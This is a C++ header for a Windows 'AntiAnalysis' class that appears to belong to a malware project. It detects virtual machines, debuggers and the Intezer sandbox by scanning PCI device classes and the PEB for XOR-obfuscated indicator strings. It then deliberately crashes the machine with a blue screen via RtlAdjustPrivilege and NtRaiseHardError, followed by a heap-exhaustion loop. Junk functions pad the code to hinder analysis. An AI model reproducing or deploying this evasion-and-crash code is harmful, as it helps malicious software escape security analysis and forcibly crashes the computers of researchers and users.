#pragma once
#include <phnt_windows.h>
#include <phnt.h>
#include "ntregapi.h"
#include <intrin.h>
#include <SetupAPI.h>
#include <devguid.h>
#include "config.h"
#include "util.h"
#include "SetupAPIWrapper.hpp"
#include "NtWrapper.hpp"

#define PHNT_VERSION PHNT_WIN7 // Windows 7
#define MAX_KEY_LENGTH 255

__declspec(noinline) static const volatile void junkCode(void)
{
    // Do something
}

class AntiAnalysis
{
public:

    AntiAnalysis(SetupAPIWrapper& setup_wrapper, NtWrapper& nt_wrapper) :
        IS(setup_wrapper),
		ntdll(nt_wrapper)
    {}
    
    const VOID Execute()
    {
        VMPresentBSOD();
        DebuggerPresentBSOD();
    }

    const VOID VMPresentBSOD()
    {
        UINT iScore = PCIDevices(VM_INDICATOR_MINIMUM);
        if(iScore >= VM_INDICATOR_MINIMUM)
		{
			ILog("VM detected, BSODing...\n");
			TriggerBSOD();
		}
    }
    
    const VOID DebuggerPresentBSOD()
    {
        PPEB pPeb = util::GetPPEB();
        PKUSER_SHARED_DATA pUSHD = (PKUSER_SHARED_DATA)0x7FFE0000;

        if (pPeb->BeingDebugged)
        {
            ILog("Ring3 debugger attached\n");
            TriggerBSOD();
        }

        if (pUSHD->KdDebuggerEnabled)
        {
            ILog("Ring0 debugger attached\n");
            TriggerBSOD();
        }
    }
private:
#if BSOD == 1
    const VOID TriggerBSOD()
    {
        BOOLEAN bReturn;
        ULONG uResponse;

        ntdll.RtlAdjustPrivilege(19, TRUE, FALSE, &bReturn);
        ntdll.NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &uResponse); // Shutdown

        while (true)
        {
            // In this loop we allocate memory on the heap until it crashes
            LPWSTR heapString = new WCHAR[9021];
            for (int i = 0; i < 68; i++)
            {
                // Insert a random character
                heapString[i] = (WCHAR)(rand() % 0x7F);
            }
        }
    }
#else
    const VOID TriggerBSOD()
    {
        ILog("We would normally BSOD here\n");
    }
#endif


    class XorList {
    public:

        static void setKey(const wchar_t* xorKey)
        {
            key = xorKey;
        }

        __declspec(noinline) static const volatile void doNothing(void)
        {
            for (int i = 0; i <= 22; i++)
            {
                int j = i % 2;
            }
        }
        
#ifdef _DEBUG
        __declspec(noinline) static void encode(const wchar_t* input, const wchar_t* key)
        {
            size_t input_len = wcslen(input);
            size_t key_len = wcslen(key);

            for (size_t i = 0; i < input_len; i++)
            {
                wchar_t xor_result = (input[i] & ~key[i % key_len]) | (~input[i] & key[i % key_len]);
                ILog("\\x%x", xor_result);
                junkCode();
                doNothing();
            }
            ILog("\n");
        }
#endif

        __declspec(noinline) static void XOR(const wchar_t* input, const wchar_t* key, wchar_t* out)
        {
            size_t input_len = wcslen(input);
            size_t key_len = wcslen(key);
            
            // FIX THIS HEAP FUCKERY
            wchar_t outputBuf[512];
            wchar_t* output = outputBuf;
            std::wcscpy(output, input);
            // XOR each character of the input string with the corresponding character of the key
            for (size_t i = 0; i <= input_len; i++)
            {
				// XOR the characters
                junkCode();
                output[i] = (volatile WCHAR)((input[i] & ~key[i % key_len]) | (~input[i] & key[i % key_len]));
                doNothing();
            } 
            output[input_len] = '\0';

            for (int j = 0; j <= wcslen(output); j++)
            {
				out[j] = output[j];
            }
        }

        XorList(const wchar_t* vendorID) : m_vendorID(vendorID) {
            this->m_size = (sizeof(vendorID) / sizeof(vendorID[0]));
        }

        operator const wchar_t* () const {
            return m_vendorID;
        }

        friend std::ostream& operator<<(std::ostream& out, const XorList& vendor) {
            std::vector<wchar_t> output(wcslen(vendor.m_vendorID));
            XOR(vendor.m_vendorID, key, output.data());
            std::wstring wstr(output.data());
            out << std::string(wstr.begin(), wstr.end());
            return out;
        }
        
        class iterator {
        public:

            iterator(const wchar_t* ptr) : m_ptr(ptr) {}

            operator const wchar_t* () const {
                //return XOR(m_ptr, L"stuff");
            }

            const XorList operator*() const {
                return (XorList(m_ptr));
            }

            iterator& operator++() {
                ++m_ptr;
                return *this;
            }

            bool operator!=(const iterator& other) const {
                return m_ptr != other.m_ptr;
            }

        private:
            const wchar_t* m_ptr;
        };

        iterator begin() {
            return iterator(m_vendorID);
        }

        iterator end() {
            return iterator(m_vendorID + m_size);
        }

    private:
        const wchar_t* m_vendorID;
        static const wchar_t* key;
        wchar_t* it_cur;
        int m_size;
    };
    /*
    INT AntiVM::EnumRegistry()
    {
        // Definitions
        INT iScore = 0;
        using VendorIdStr = WCHAR[10];
        static const VendorIdStr vendors[]
        {
            L"VEN_15AD", // VMWare
            L"VEN_80EE", // Oracle
            L"VEN_1AB8"  // Parallels
        };

        HKEY hKey;
        LPWSTR subkeyName = new WCHAR[MAX_KEY_LENGTH];
        DWORD subkeyNameLength = 0;
        DWORD subkeyIndex = 0;
        DWORD maxSubkeyNameLength;
        std::regex pattern("VEN_(\\w{4})&DEV_(\\w{4})");
        std::smatch match;

        // Open the key

        LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Enum\\PCI"), KEY_WOW64_32KEY, KEY_READ, &hKey);
        if (result != ERROR_SUCCESS)
        {
            std::cout << "Error opening key: " << result << std::endl;
            return FALSE;
        }

        // Enumerate the subkeys

        while (result == ERROR_SUCCESS)
        {
            // Get the name of the subkey
            subkeyNameLength = MAX_KEY_LENGTH;
            result = RegEnumKeyEx(hKey, // Top level key
                subkeyIndex,            // Subkey index
                subkeyName,             // Subkey name buffer
                &subkeyNameLength,      // Length buffer
                NULL, NULL, NULL, NULL);

            if (result == ERROR_NO_MORE_ITEMS)
            {
                break;
            }
            else if (result != ERROR_SUCCESS)
            {
                std::cout << "Error enumerating subkeys: " << result << std::endl;
                break;
            }

            // Check against Vendor ID table
            for (const auto& potential_vendor : vendors)
            {
                // Hypervisor present
                if (wcsncmp(subkeyName, potential_vendor, 8) == 0)
                {
                    ILog("PCI Device found in registry: %ls\n", potential_vendor);
                    iScore += 1;
                }
            }

            ILog("%ls // ", subkeyName);
            ZeroMemory(subkeyName, MAX_KEY_LENGTH);
            subkeyIndex++;
        }

        // Close the key

        delete[] subkeyName;
        RegCloseKey(hKey);
        return iScore;
    }
    */
    /*
    __forceinline __declspec(naked) void RepairStackFrame() {


    }*/
    // TODO: This


    const INT PCIDevices(INT VM_CONFIDENCE_MINIMUM)
    {
        // Definitions
		// Return if the class constructor failed
        if (!IS.IReady)
            return 1;
        
        using VendorIdStr = WCHAR[10];
        using DeviceDesc = WCHAR[256];
        TCHAR szDeviceDescription[MAX_PATH];
        DWORD dwSize = MAX_PATH;
        INT iScore = 0;

        static const VendorIdStr vendors[]
        {
            L"VEN_15AD", // VMWare
            L"VEN_80EE", // Oracle
            L"VEN_1AB8"  // Parallels
        };

        static const XorList devices[] =
        {
            L"\x3\x2d\x41\x56\x64\x34\x28\x71\x4d\x69\x00", // VirtualBox
            L"\x1d\x3d\x43\x47\x63\x78\x12\x00",            // Hyper-V
            L"\x18\x2d\x50\x50\x7e\x26\x2b\x55\x56\x31\x1d\x3d\x43\x47\x63\x78\x12\x00", // Microsoft Hyper-V
            L"\x14\x7\x63\x6b\x4d\x1d\x1d\x63\x67\x43\xa\x12\x6c\x65\x54\x1b\x1b\x70\x6d\x44\x1b\x10\x76\x70\x4e\x3\x75\x00", // ACPI\HYPER_V_GEN_COUNTER_V1
            L"\x03\x09\x71\x77\x42\x00", // VMBUS
            L"\x1\x21\x41\x4f\x78\x3b\x25\x5f\x2\x42\x30\x36\x45\x47\x63\x75\xf\x56\x5b\x73\x3a\x25\x41\x46\x31\x11\x36\x5a\x54\x74\x27\x00", // Intezer
        };

        static const GUID GUIDs[]
        {
            { 0x4d36e97d, 0xe325, 0x11ce, { 0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18 } }, // PCI Enum
            { 0x4d36e967, 0xe325, 0x11ce, { 0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18 } }, // Hyper-V Disk
            { 0x4d36e972, 0xe325, 0x11ce, { 0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18 } }, // Hyper-V Network
            { 0x2ddaf7c6, 0x6f8b, 0x4f82, { 0x9f, 0x51, 0x11, 0x7e, 0xf5, 0x33, 0x74, 0x9f } }, // VMWare VMCI
            { 0x69ef75c0, 0x19ef, 0x11d3, { 0x9a, 0x81, 0x00, 0xc0, 0x4f, 0x61, 0xcf, 0x9b } }, // VMWare Network
            { 0x3f7d13c0, 0x7a3f, 0x11d3, { 0x9a, 0x81, 0x00, 0xc0, 0x4f, 0x61, 0xcf, 0x9b } }, // VMWare USB Hub
            { 0x4d36e97c, 0xe325, 0x11ce, { 0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18 } }, // DEVCLASS PCIe
            { 0x5d6fdb70, 0x5777, 0x44e5, { 0x9d, 0x6e, 0x7d, 0xe5, 0x04, 0x52, 0xc5, 0x5e } }, // DEVCLASS VMS
            { 0x4b6c4673, 0x3d3d, 0x40f3, { 0xa9, 0x70, 0x58, 0xc2, 0x2e, 0x56, 0x6f, 0x97 } }, // DEVCLASS VMS XEN
            { 0x7edc5404, 0xeee8, 0x47c9, { 0x9a, 0x5d, 0x2b, 0x5d, 0x6f, 0x9c, 0x42, 0x4b } }, // DEVCLASS VMS KVM
        };
        
        // Open a handle to the device information set for all PCI devices
        for (const auto& guid : GUIDs)
        {
            HDEVINFO device_info_set = IS.SetupDiGetClassDevsExW(
                &guid,  // Class GUID for PCI devices
                NULL,                    // Enumerator
                NULL,                    // hwndParent
                DIGCF_PRESENT,           // Flags
                NULL,                    // Device info set
                NULL,                    // Machine name
                NULL                     // Reserved
            );
            if (device_info_set == INVALID_HANDLE_VALUE)
            {
                // SetupDiGetClassDevsEx failed
                ILog("Setup failed\n");
                return 1;
            }
            // Enumerate the devices in the device information set
            SP_DEVINFO_DATA device_info_data;
            device_info_data.cbSize = sizeof(SP_DEVINFO_DATA);
            int index = 0;

            while (IS.SetupDiEnumDeviceInfo(device_info_set, index, &device_info_data) != FALSE)
            {
                // Get the device instance ID
                DWORD required_size;
                IS.SafeSetupDiGetDeviceInstanceIdW(device_info_set, &device_info_data, NULL, 0, &required_size);
                LPWSTR device_instance_id = new WCHAR[required_size+1];
                IS.SafeSetupDiGetDeviceInstanceIdW(device_info_set, &device_info_data, device_instance_id, required_size, NULL);

                if (IS.SetupDiGetDeviceRegistryPropertyW(device_info_set, &device_info_data, SPDRP_DEVICEDESC, NULL, (PBYTE)szDeviceDescription, dwSize, &dwSize))
                {
                    //ILog("Device: %.55ls\n", szDeviceDescription);
                    for (const auto& device : devices)
                    {
                        wchar_t* deviceDecoded = new wchar_t[wcslen(device) + 1];
                        devices->XOR(device, L"\x55\x44\x33\x22\x11\x00", deviceDecoded);
                        //ILog("%ls did not match %ls\n", szDeviceDescription, deviceDecoded);
                        if (wcsncmp(szDeviceDescription, deviceDecoded, wcslen(deviceDecoded) - 1) == 0)
                        {
                            ILog("Found VM indicator: %.55ls\n", szDeviceDescription);
                            iScore += 1;
                            if (iScore >= VM_CONFIDENCE_MINIMUM)
                            {
                                delete[] device_instance_id;
                                return iScore;
                            }
                        }
                        delete[] deviceDecoded;
                    }
                }
                else
                {
                    for (const auto& device : devices)
                    {
                        wchar_t* deviceDecoded = new wchar_t[wcslen(device) + 1];
                        devices->XOR(device, L"\x55\x44\x33\x22\x11\x00", deviceDecoded);
                        //ILog("%ls did not match %ls\n", device_instance_id, deviceDecoded);
                        if (wcsncmp(device_instance_id, deviceDecoded, wcslen(deviceDecoded) - 1) == 0)
                        {
                            ILog("Found VM indicator: %.55ls\n", device_instance_id);
                            iScore += 1;
                            if (iScore >= VM_CONFIDENCE_MINIMUM)
                            {
                                delete[] device_instance_id;
                                return iScore;
                            }
                        }
                        delete[] deviceDecoded;
                    }
                }
                //else ILog("Device: %.55ls\n", device_instance_id);
                // Clean up
                delete[] device_instance_id;
                index++;
            }
            // Clean up
            IS.SetupDiDestroyDeviceInfoList(device_info_set);
        }
        return iScore;
    }

    private:
        SetupAPIWrapper& IS;
        NtWrapper& ntdll;
};